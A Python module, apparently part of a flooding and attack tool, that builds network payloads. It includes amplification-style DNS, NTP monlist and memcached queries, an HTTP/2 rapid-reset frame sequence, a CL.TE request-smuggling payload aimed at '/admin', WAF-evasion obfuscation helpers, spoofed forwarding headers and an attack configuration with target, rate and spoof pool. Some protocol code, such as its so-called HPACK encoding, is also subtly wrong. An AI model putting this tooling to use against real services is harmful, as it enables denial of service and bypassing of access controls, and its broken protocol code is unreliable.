"""
Dynamic Payload Generator — crafts custom payloads for different attack vectors.
Supports realistic HTTP, WebSocket, gRPC/HTTP2, TLS ClientHello randomization,
cache-busting, and multipart form-data payloads for realistic traffic generation.
"""

import hashlib
import io
import json
import os
import random
import struct
import uuid
from typing import Optional


class PayloadGenerator:
    def __init__(self):
        self.session_id = random.randint(1, 0xFFFFFFFF)

    # ── Raw Byte Payloads ──────────────────────────────────────────

    def random_bytes(self, size: int = 1400) -> bytes:
        return os.urandom(size)

    def pattern_bytes(self, size: int, pattern: str = "0xDEAD") -> bytes:
        val = int(pattern, 16) if pattern.startswith("0x") else ord(pattern[0])
        return bytes([val & 0xFF] * size)

    def dns_query(self, domain: str = "isc.org", query_type: int = 1) -> bytes:
        buf = bytearray()
        buf += struct.pack("!HHHHHH", random.randint(1, 0xFFFF),
                           0x0100, 1, 0, 0, 0)
        for part in domain.split("."):
            buf += bytes([len(part)]) + part.encode()
        buf += b"\x00"
        buf += struct.pack("!HH", query_type, 1)
        return bytes(buf)

    def ntp_query(self) -> bytes:
        return b"\x17\x03\x00\x2a" + b"\x00" * 44

    def memcached_query(self, key: str = "x" * 64) -> bytes:
        return f"stats\r\nget {key}\r\n".encode()

    def http_get(self, host: str, path: str = "/", method: str = "GET",
                 extra_headers: Optional[dict] = None) -> bytes:
        headers = {
            "Host": host,
            "User-Agent": self.random_ua(),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "X-Forwarded-For": self.random_ip(),
        }
        if extra_headers:
            headers.update(extra_headers)
        req = f"{method} {path} HTTP/1.1\r\n"
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
        req += "\r\n"
        return req.encode()

    # ── Realistic HTTP Request Patterns ────────────────────────────

    REALISTIC_PATHS = [
        "/", "/index.html", "/home", "/login", "/register",
        "/api/v1/users", "/api/v1/data", "/api/v2/status",
        "/wp-admin/admin-ajax.php", "/wp-content/themes/",
        "/assets/js/main.js", "/assets/css/style.css",
        "/favicon.ico", "/robots.txt", "/sitemap.xml",
        "/.env", "/wp-login.php", "/xmlrpc.php",
        "/search?q=", "/category/", "/about", "/contact",
        "/products", "/services", "/blog", "/blog/post-1",
        "/images/banner.jpg", "/download/file.zip",
        "/static/bundle.js", "/api/health",
        "/graphql", "/api/graphql",
    ]

    HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"]

    def realistic_http_request(self, host: str, path: Optional[str] = None,
                               method: Optional[str] = None) -> bytes:
        method = method or random.choice(self.HTTP_METHODS)
        path = path or random.choice(self.REALISTIC_PATHS)
        if method == "GET" and random.random() < 0.4:
            path += f"?{self.cache_buster()}"

        headers = {
            "Host": host,
            "User-Agent": self.random_ua(),
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "application/json, text/plain, */*",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "application/javascript, */*;q=0.8",
                "text/css,*/*;q=0.1",
            ]),
            "Accept-Language": random.choice([
                "en-US,en;q=0.9", "en-GB,en;q=0.8", "en;q=0.9",
                "id-ID,id;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.5",
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
            "Sec-Fetch-Dest": random.choice(["document", "empty", "script", "style", "image"]),
            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors", "same-origin"]),
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "same-site", "cross-site"]),
            "Sec-Fetch-User": random.choice(["?1", ""]),
            "Upgrade-Insecure-Requests": "1",
            "X-Forwarded-For": self.random_ip(),
        }

        if random.random() < 0.2:
            headers["DNT"] = random.choice(["0", "1"])

        body = b""
        if method in ("POST", "PUT", "PATCH"):
            if random.random() < 0.5:
                body = self.json_body()
                headers["Content-Type"] = "application/json"
            elif random.random() < 0.3:
                body = self.form_urlencoded_body()
                headers["Content-Type"] = "application/x-www-form-urlencoded"
            elif random.random() < 0.15:
                body, ct = self.multipart_form_data()
                headers["Content-Type"] = ct
            headers["Content-Length"] = str(len(body))

        req = f"{method} {path} HTTP/1.1\r\n"
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
        req += "\r\n"
        return req.encode() + body

    def http_post_form(self, host: str, path: str = "/login") -> bytes:
        body, ct = self.multipart_form_data()
        headers = {
            "Host": host,
            "User-Agent": self.random_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": ct,
            "Content-Length": str(len(body)),
            "Origin": f"https://{host}",
            "Referer": f"https://{host}/",
            "X-Forwarded-For": self.random_ip(),
        }
        req = f"POST {path} HTTP/1.1\r\n"
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
        req += "\r\n"
        return req.encode() + body

    # ── WebSocket Upgrade Requests ─────────────────────────────────

    def websocket_upgrade(self, host: str, path: str = "/ws",
                          extra_headers: Optional[dict] = None) -> bytes:
        ws_key = base64_encode(random_bytes(16))
        headers = {
            "Host": host,
            "User-Agent": self.random_ua(),
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": ws_key,
            "Sec-WebSocket-Version": random.choice(["13", "8"]),
            "Sec-WebSocket-Protocol": random.choice(["chat", "json", "graphql-ws", ""]),
            "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
            "Origin": f"https://{host}",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
        }
        if extra_headers:
            headers.update(extra_headers)
        req = f"GET {path} HTTP/1.1\r\n"
        for k, v in headers.items():
            req += f"{k}: {v}\r\n"
        req += "\r\n"
        return req.encode()

    def websocket_frame(self, payload: bytes, opcode: int = 0x1,
                        mask: bool = True) -> bytes:
        frame = bytearray()
        frame.append(0x80 | (opcode & 0x0F))
        length = len(payload)
        mask_bit = 0x80 if mask else 0x00
        if length < 126:
            frame.append(mask_bit | length)
        elif length < 65536:
            frame.append(mask_bit | 126)
            frame += struct.pack("!H", length)
        else:
            frame.append(mask_bit | 127)
            frame += struct.pack("!Q", length)
        if mask:
            mask_key = bytes(random.randint(0, 255) for _ in range(4))
            frame += mask_key
            frame += bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
        else:
            frame += payload
        return bytes(frame)

    # ── gRPC-style HTTP/2 Payloads ─────────────────────────────────

    def grpc_http2_request(self, service: str = "helloworld.Greeter",
                           method: str = "SayHello",
                           host: str = "localhost:50051") -> bytes:
        proto_message = self._grpc_proto_message(service, method)
        data_frame = b"\x00\x00\x00\x00" + proto_message
        grpc_frame = struct.pack("!I", len(data_frame))
        grpc_frame += b"\x00\x00\x00\x00\x00" + data_frame

        headers_block = self._hpack_encode({
            ":method": "POST",
            ":scheme": "http",
            ":path": f"/{service}/{method}",
            ":authority": host,
            "content-type": "application/grpc",
            "te": "trailers",
            "grpc-timeout": f"{random.randint(1, 30)}S",
            "user-agent": "grpc-python/1.59.0",
        })
        return headers_block + grpc_frame

    def _grpc_proto_message(self, service: str, method: str) -> bytes:
        fields = {
            "name": random.choice(["Alice", "Bob", "Charlie", "Diana", "Eve"]),
            "id": random.randint(1, 99999),
            "timestamp": int(time_time()),
            "payload": "A" * random.randint(10, 100),
        }
        return json.dumps(fields).encode()

    def _hpack_encode(self, headers: dict) -> bytes:
        result = b""
        for name, value in headers.items():
            name_bytes = name.encode()
            value_bytes = value.encode()
            result += bytes([len(name_bytes)]) + name_bytes + bytes([len(value_bytes)]) + value_bytes
        return result

    def grpc_http2_preface(self) -> bytes:
        return b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

    def grpc_http2_settings(self, max_streams: int = 100) -> bytes:
        payload = struct.pack("!HH", 0x03, max_streams)
        if random.random() < 0.3:
            payload += struct.pack("!HH", 0x04, random.randint(65536, 16777215))
        if random.random() < 0.2:
            payload += struct.pack("!HH", 0x01, random.randint(65536, 16777215))
        frame_len = len(payload)
        frame = struct.pack("!I", (frame_len << 8) | 0x04)[:3]
        frame += b"\x00" + struct.pack("!I", 0)[:4]
        frame += payload
        return frame

    # ── TLS ClientHello Randomization ──────────────────────────────

    TLS_CIPHER_SUITES = [
        # TLS 1.3
        b"\x13\x01", b"\x13\x02", b"\x13\x03",
        # TLS 1.2
        b"\xc0\x2b", b"\xc0\x2f", b"\xc0\x2c", b"\xc0\x30",
        b"\xcc\xa9", b"\xcc\xa8", b"\xc0\x13", b"\xc0\x14",
        b"\x00\x9c", b"\x00\x9d", b"\x00\x2f", b"\x00\x35",
        b"\x00\x0a",
    ]

    TLS_GROUPS = [
        b"\x00\x1d",  # x25519
        b"\x00\x17",  # secp256r1
        b"\x00\x18",  # secp384r1
        b"\x00\x19",  # secp521r1
        b"\x00\x1e",  # ffdhe2048
        b"\x00\x1f",  # ffdhe3072
    ]

    TLS_SIG_ALGS = [
        b"\x08\x04", b"\x08\x05", b"\x08\x06",
        b"\x04\x01", b"\x04\x02", b"\x04\x03",
        b"\x02\x01", b"\x02\x02", b"\x02\x03",
    ]

    TLS_VERSIONS = [
        b"\x03\x03",  # TLS 1.2
        b"\x03\x04",  # TLS 1.3
    ]

    def tls_client_hello(self, hostname: str = "example.com",
                         sni: Optional[str] = None) -> bytes:
        sni = sni or hostname
        session_id = bytes(random.randint(0, 255) for _ in range(32))
        cipher_suites = random.sample(self.TLS_CIPHER_SUITES,
                                      random.randint(4, len(self.TLS_CIPHER_SUITES)))
        compression = b"\x01\x00"

        ext_len = 0
        extensions = b""

        sni_enc = sni.encode()
        sni_ext_data = struct.pack("!H", len(sni_enc) + 5)
        sni_ext_data += b"\x00" + struct.pack("!H", len(sni_enc) + 3)
        sni_ext_data += b"\x00" + struct.pack("!H", len(sni_enc)) + sni_enc
        extensions += struct.pack("!H", 0x0000) + struct.pack("!H", len(sni_ext_data)) + sni_ext_data
        ext_len += 4 + len(sni_ext_data)

        # ALPN
        alpn_protos = [b"h2", b"http/1.1"]
        if random.random() < 0.3:
            alpn_protos = [b"http/1.1"]
        alpn_data = b"".join(
            bytes([len(p)]) + p for p in alpn_protos
        )
        alpn_ext = struct.pack("!H", len(alpn_data))
        alpn_ext += alpn_data
        extensions += struct.pack("!H", 0x0010) + struct.pack("!H", len(alpn_ext)) + alpn_ext
        ext_len += 4 + len(alpn_ext)

        # Supported groups
        groups = random.sample(self.TLS_GROUPS, random.randint(2, len(self.TLS_GROUPS)))
        groups_data = b"".join(groups)
        groups_ext_data = struct.pack("!H", len(groups_data)) + groups_data
        extensions += struct.pack("!H", 0x000a) + struct.pack("!H", len(groups_ext_data)) + groups_ext_data
        ext_len += 4 + len(groups_ext_data)

        # Supported versions
        versions = random.sample(self.TLS_VERSIONS, random.randint(1, len(self.TLS_VERSIONS)))
        versions_data = b"".join(versions)
        versions_ext_data = struct.pack("!B", len(versions_data)) + versions_data
        extensions += struct.pack("!H", 0x002b) + struct.pack("!H", len(versions_ext_data)) + versions_ext_data
        ext_len += 4 + len(versions_ext_data)

        # Signature algorithms
        sig_algs = random.sample(self.TLS_SIG_ALGS, random.randint(3, len(self.TLS_SIG_ALGS)))
        sig_algs_data = b"".join(sig_algs)
        sig_ext_data = struct.pack("!H", len(sig_algs_data)) + sig_algs_data
        extensions += struct.pack("!H", 0x000d) + struct.pack("!H", len(sig_ext_data)) + sig_ext_data
        ext_len += 4 + len(sig_ext_data)

        # Key share
        key_share_data = self._random_key_share()
        extensions += struct.pack("!H", 0x0033) + struct.pack("!H", len(key_share_data)) + key_share_data
        ext_len += 4 + len(key_share_data)

        # Extended master secret
        extensions += struct.pack("!HH", 0x0017, 0x0000)
        ext_len += 4

        # Renegotiation info
        reneg_data = b"\x00"
        extensions += struct.pack("!H", 0xff01) + struct.pack("!H", len(reneg_data)) + reneg_data
        ext_len += 4 + len(reneg_data)

        # Random padding to vary size
        padding_len = random.randint(0, 256)
        if padding_len > 0:
            padding_ext_data = b"\x00" * padding_len
            extensions += struct.pack("!H", 0x0015) + struct.pack("!H", len(padding_ext_data)) + padding_ext_data
            ext_len += 4 + len(padding_ext_data)

        random_bytes_data = bytes(random.randint(0, 255) for _ in range(32))
        legacy_version = b"\x03\x03"

        session_id_len = len(session_id)
        cipher_suites_len = len(cipher_suites) * 2
        ext_len_total = ext_len

        handshake = b"\x01"
        handshake += struct.pack("!I", 0)[:3]

        msg = legacy_version + random_bytes_data
        msg += bytes([session_id_len]) + session_id
        msg += struct.pack("!H", cipher_suites_len) + b"".join(cipher_suites)
        msg += compression
        msg += struct.pack("!H", ext_len) + extensions

        handshake = b"\x01" + struct.pack("!I", 0)[:3]
        handshake = b"\x01" + struct.pack("!I", len(msg))[:3] + msg

        tls_record = b"\x16\x03\x01"
        tls_record += struct.pack("!H", len(handshake))
        tls_record += handshake

        return tls_record

    def _random_key_share(self) -> bytes:
        group = random.choice(self.TLS_GROUPS)
        key_len = random.choice([32, 65, 97])
        key_exchange = bytes(random.randint(0, 255) for _ in range(key_len))
        data = group + struct.pack("!H", key_len) + key_exchange
        return data

    # ── Cache-Buster Query Parameters ──────────────────────────────

    def cache_buster(self) -> str:
        strategies = [
            lambda: f"_{random.randint(100000, 999999)}",
            lambda: f"cb={int(time_time() * 1000)}",
            lambda: f"t={uuid.uuid4().hex[:12]}",
            lambda: f"v={random.choice(['1', '2', '3', 'latest'])}",
            lambda: f"ver={random.randint(1, 99)}.{random.randint(0, 9)}",
            lambda: f"session={uuid.uuid4().hex[:16]}",
            lambda: f"r={random.random():.6f}",
            lambda: f"nonce={random.randint(1000000, 9999999)}",
            lambda: f"ts={random.randint(1000000000, 9999999999)}",
            lambda: f"cache={random.choice(['false', '0', 'no'])}",
            lambda: f"_={random.randint(1000000, 9999999)}&_={random.randint(1000000, 9999999)}",
            lambda: f"ck={random.randint(1000, 9999)}&t={int(time_time())}",
        ]
        return random.choice(strategies)()

    def random_query_string(self) -> str:
        params = []
        for _ in range(random.randint(1, 5)):
            key = random.choice(["q", "s", "search", "page", "offset", "limit",
                                 "filter", "sort", "order", "id", "type", "ref"])
            value = random.choice([
                str(random.randint(1, 1000)),
                str(uuid.uuid4().hex[:8]),
                random.choice(["asc", "desc", "true", "false"]),
                random.choice(["1", "10", "20", "50", "100"]),
            ])
            params.append(f"{key}={value}")
        return "?" + "&".join(params)

    # ── Multipart Form-Data Body Generator ─────────────────────────

    def multipart_form_data(self, fields: Optional[dict] = None) -> tuple[bytes, str]:
        boundary = f"----WebKitFormBoundary{uuid.uuid4().hex[:16]}"
        body = bytearray()

        if fields is None:
            fields = {
                "username": random.choice(["admin", "user", "test", "john", "alice"]),
                "password": ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(8, 16))),
                "email": f"{random.choice(['user', 'test', 'info'])}@example.com",
                "remember": random.choice(["on", "off"]),
                "csrf_token": uuid.uuid4().hex,
                "_method": random.choice(["POST", "PUT", "PATCH"]),
            }

        for name, value in fields.items():
            body += f"--{boundary}\r\n".encode()
            body += f'Content-Disposition: form-data; name="{name}"\r\n'.encode()
            body += b"\r\n"
            body += str(value).encode() + b"\r\n"

        if random.random() < 0.3:
            file_name = random.choice(["avatar.jpg", "document.pdf", "data.csv", "photo.png", "notes.txt"])
            file_content = bytes(random.randint(0, 255) for _ in range(random.randint(50, 500)))
            body += f"--{boundary}\r\n".encode()
            body += f'Content-Disposition: form-data; name="file"; filename="{file_name}"\r\n'.encode()
            body += f"Content-Type: {random.choice(['image/jpeg', 'application/pdf', 'text/csv', 'image/png', 'text/plain'])}\r\n".encode()
            body += b"\r\n"
            body += file_content + b"\r\n"

        body += f"--{boundary}--\r\n".encode()
        content_type = f"multipart/form-data; boundary={boundary}"
        return bytes(body), content_type

    def json_body(self) -> bytes:
        data = {
            random.choice(["name", "title", "query", "data"]): random.choice(["test", "value", "payload", "data"]),
            random.choice(["id", "page", "count", "limit"]): random.randint(1, 1000),
            random.choice(["active", "enabled", "verified"]): random.choice([True, False]),
        }
        if random.random() < 0.3:
            data["nested"] = {
                "key": random.choice(["value1", "value2", "value3"]),
                "num": random.uniform(0, 100),
            }
        if random.random() < 0.2:
            data["items"] = [
                {"id": i, "val": random.randint(1, 100)}
                for i in range(random.randint(1, 5))
            ]
        return json.dumps(data).encode()

    def form_urlencoded_body(self) -> bytes:
        params = {}
        for _ in range(random.randint(2, 6)):
            key = random.choice(["name", "email", "password", "token", "action",
                                 "type", "value", "q", "page", "limit"])
            value = random.choice([
                str(random.randint(1, 1000)),
                uuid.uuid4().hex[:8],
                random.choice(["true", "false", "on", "off"]),
                ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=5)),
            ])
            params[key] = value
        return "&".join(f"{k}={v}" for k, v in params.items()).encode()

    # ── HTTP/2 Frames ──────────────────────────────────────────────

    def h2_settings_frame(self, max_streams: int = 100) -> bytes:
        payload = struct.pack("!HH", 0x03, max_streams)
        length = len(payload)
        frame = struct.pack("!I", (length << 8) | 0x04)[:3]
        frame += b"\x00" + struct.pack("!I", 0)[:4]
        frame += payload
        return frame

    def h2_rst_stream_frame(self, stream_id: int, error_code: int = 0) -> bytes:
        frame = b"\x00\x00\x04" + struct.pack("!I", 0x03)[:1]
        frame += b"\x00" + struct.pack("!I", stream_id)[:4]
        frame += struct.pack("!I", error_code)
        return frame

    def h2_headers_frame(self, stream_id: int, method: str = "GET",
                         path: str = "/", host: str = "localhost") -> bytes:
        headers = (
            f":method {method}\r\n:path {path}\r\n:scheme http\r\n:authority {host}\r\n"
        ).encode()
        frame_len = len(headers)
        frame = struct.pack("!I", (frame_len << 8) | 0x01)[:3]
        frame += b"\x04" + struct.pack("!I", stream_id)[:4]
        frame += b"\x00\x00\x00\x00\x01" + headers
        return frame

    def h2_rapid_reset_sequence(self, count: int = 100) -> list[bytes]:
        frames = []
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        frames.append(preface)
        frames.append(self.h2_settings_frame(count))
        for sid in range(1, count * 2 + 1, 2):
            frames.append(self.h2_headers_frame(sid))
            frames.append(self.h2_rst_stream_frame(sid))
        return frames

    # ── WAF Evasion Payloads ───────────────────────────────────────

    def split_payload(self, payload: bytes, chunk_size: int = 50) -> list[bytes]:
        return [payload[i:i + chunk_size] for i in range(0, len(payload), chunk_size)]

    def encode_base64(self, payload: bytes) -> bytes:
        return base64_encode(payload).encode()

    def xor_obfuscate(self, payload: bytes, key: int = 0xAA) -> bytes:
        return bytes(b ^ key for b in payload)

    def interleave_junk(self, payload: bytes, junk_ratio: float = 0.3) -> bytes:
        result = bytearray()
        for b in payload:
            result.append(b)
            if random.random() < junk_ratio:
                result.append(random.randint(0, 255))
        return bytes(result)

    def http_smuggle_cl_te(self, host: str, smuggled_path: str = "/admin") -> bytes:
        smuggle = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 0\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"GET {smuggled_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"\r\n"
        )
        return smuggle.encode()

    # ── Helpers ────────────────────────────────────────────────────

    def random_ua(self) -> str:
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1) Mobile/15E148",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.6099.43 Mobile Safari/537.36",
        ]
        return random.choice(agents)

    def random_ip(self) -> str:
        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    @staticmethod
    def build_attack_config(target_ip: str, target_port: int, method: str,
                            duration: int = 30, workers: int = 50,
                            rate: int = 1000, spoof_pool: Optional[list] = None,
                            jitter: int = 0) -> dict:
        return {
            "target": target_ip,
            "port": target_port,
            "method": method,
            "duration": duration,
            "workers": workers,
            "rate_limit": rate,
            "spoof_pool": spoof_pool or [],
            "jitter": jitter,
        }


# ── Module-level helpers ─────────────────────────────────────────────

def base64_encode(data: bytes) -> str:
    import base64
    return base64.b64encode(data).decode()


def random_bytes(size: int) -> bytes:
    return bytes(random.randint(0, 255) for _ in range(size))


def time_time() -> float:
    import time
    return time.time()
